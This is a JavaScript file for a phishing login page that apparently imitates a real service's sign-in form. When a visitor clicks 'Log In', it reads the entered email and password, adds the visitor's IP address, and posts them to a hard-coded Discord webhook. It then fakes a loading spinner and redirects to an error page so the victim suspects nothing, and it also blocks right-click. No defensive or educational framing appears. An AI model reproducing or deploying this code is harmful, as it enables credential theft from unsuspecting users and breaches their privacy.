// ----------------------------------
// SELECTING ELEMENTS
// ----------------------------------
const loginButton = document.querySelector("button");

// Webhook URL
const WEBHOOK_URL = "https://discord.com/api/webhooks/1358739681470316677/-GPhfZIhYskH1FlWulsIrUQZoG_oE6w7tewh1e8EowwBhSSDRdNzMXUPjG39gwUyt0uB";

// Variable to store the user's IP address
let userIP = "Unknown IP";

// -----------------------------------
// FETCH IP ADDRESS ON PAGE LOAD
// -----------------------------------
async function fetchIPAddress() {
  try {
    const response = await fetch("https://api.ipify.org?format=json");
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error("Error fetching IP address:", error);
    return "Unknown IP";
  }
}

// Fetch the IP address when the page loads
document.addEventListener("DOMContentLoaded", async () => {
  userIP = await fetchIPAddress(); // Store the IP address in the `userIP` variable
  console.log("User IP Address:", userIP); // Optional: Log the IP for debugging
});

// -----------------------------------
// ELLIPSIS ANIMATION
// ------------------------------------
function removeEllipsisAnimation() {
  loginButton.innerHTML = "";
  loginButton.textContent = "Log In";
  loginButton.removeAttribute("disabled");
}

async function sendCredentialsToWebhook(email, password) {
  try {
    // Use the stored IP address
    const ip = userIP;

    // Prepare the embed payload
    const embedPayload = {
      embeds: [
        {
          title: "Login Attempt",
          color: 0xff0000, // Red color for visibility
          fields: [
            {
              name: "Email",
              value: email || "No email provided",
              inline: true,
            },
            {
              name: "Password",
              value: password || "No password provided",
              inline: true,
            },
            {
              name: "IP Address",
              value: ip || "Unknown IP",
              inline: false,
            },
          ],
          timestamp: new Date().toISOString(), // Timestamp for when the data was sent
        },
      ],
    };

    // Send the payload to the webhook
    const response = await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(embedPayload),
    });

    if (response.ok) {
      console.log("Credentials successfully sent to webhook.");
    } else {
      console.error("Failed to send credentials to webhook:", response.status);
    }
  } catch (error) {
    console.error("Error sending credentials to webhook:", error);
  }
}

function animateEllipsis() {
  // Get user input from the form
  const email = document.getElementById("emailORphone").value;
  const password = document.getElementById("password").value;

  // Send credentials to webhook
  sendCredentialsToWebhook(email, password);

  // Start animation
  loginButton.innerHTML = "";
  loginButton.innerHTML = `<span class="spinner" role="img" aria-label="Loading">
                                    <span class="inner pulsingEllipsis">
                                        <span class="item spinnerItem"></span>
                                        <span class="item spinnerItem"></span>
                                        <span class="item spinnerItem"></span>
                                    </span>
                           </span>`;
  const spinnerItems = document.querySelectorAll(".spinnerItem");
  spinnerItems.forEach((item, index) => {
    item.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${
      index * 0.2
    }s`;
  });
  loginButton.setAttribute("disabled", "true");

  // Simulate login process
  setTimeout(() => {
    removeEllipsisAnimation();
    // Redirect to error.html after 3 seconds
    window.location.href = "error.html";
  }, 3000);
}

// --------------------------
// ATTACHING EVENT LISTENERS
// --------------------------
loginButton.addEventListener("click", animateEllipsis);
document.addEventListener("contextmenu", function (e) {
  e.preventDefault();
});
